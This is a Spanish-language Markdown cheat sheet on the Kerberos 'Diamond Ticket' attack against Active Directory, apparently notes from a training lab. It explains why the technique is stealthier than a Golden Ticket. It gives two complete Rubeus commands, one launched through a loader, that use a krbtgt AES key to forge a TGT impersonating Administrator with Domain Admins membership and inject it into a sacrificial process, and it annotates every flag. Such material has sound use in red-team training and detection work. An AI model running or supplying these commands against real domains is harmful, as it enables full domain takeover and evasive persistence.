# Diamont Ticket  

Tags: #AD #Windows #Powershell #Rubeus 


```bash  
- Un 'Diamond Ticket' se crea descifrando un TGT válido, realizando modificaciones sobre él y volviéndolo a cifrar utilizando las claves AES de la cuenta 'krbtgt'.
- El 'Golden Ticket' es un ataque de 'forjado de TGT', mientras que el 'Diamond Ticket' es un ataque de 'modificación de TGT'.
- Nuevamente, el tiempo de persistencia depende de la cuenta 'krbtgt'.
- Un 'Diamond Ticket' es más seguro a nivel OPSEC porque tiene:
    - Tiempos de ticket válidos, ya que se modifica un TGT emitido por el DC
	- En el 'Golden Ticket', no existe una solicitud de TGT correspondiente a las peticiones de TGS/tickets de servicio, ya que el TGT es completamente forjado
```

## Rubeus 

```powershell 
! Usuario: Usuario de dominio válido con credenciales conocidas (requiere AES key de krbtgt)

❯ .\Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:studentx /password:StudentxPassword /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

# Forjar un Diamond Ticket usando la AES key de krbtgt y credenciales de un usuario válido — a diferencia del Golden, solicita un TGT real al DC y lo modifica en memoria, haciéndolo más difícil de detectar. Inyecta el ticket en un proceso cmd.exe sacrificio.
```

```powershell 
! Usuario: Usuario de dominio válido sin necesidad de conocer su contraseña (requiere AES key de krbtgt)

❯ .\Loader.exe -path C:\AD\Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

# Forjar un Diamond Ticket usando delegación en lugar de credenciales — obtiene un TGT del usuario actual y lo modifica para impersonar a Administrator.
# /krbkey     → AES key de krbtgt
# /tgtdeleg   → obtiene el TGT del usuario actual via delegación, sin necesidad de contraseña
# /enctype    → tipo de cifrado del ticket (aes)
# /ticketuser → usuario a impersonar
# /domain     → dominio objetivo
# /dc         → Domain Controller objetivo
# /ticketuserid → RID del usuario a impersonar (500 = Administrator)
# /groups     → grupos a incluir en el ticket (512 = Domain Admins)
# /createnetonly → crea proceso sacrificio para inyectar el ticket sin contaminar la sesión actual
# /show       → muestra el proceso creado
# /ptt        → inyecta el ticket directamente en la sesión
```

[![Diamont-Ticket.png](https://i.postimg.cc/25jnT74h/Diamont-Ticket.png)](https://postimg.cc/WdKD1rY1)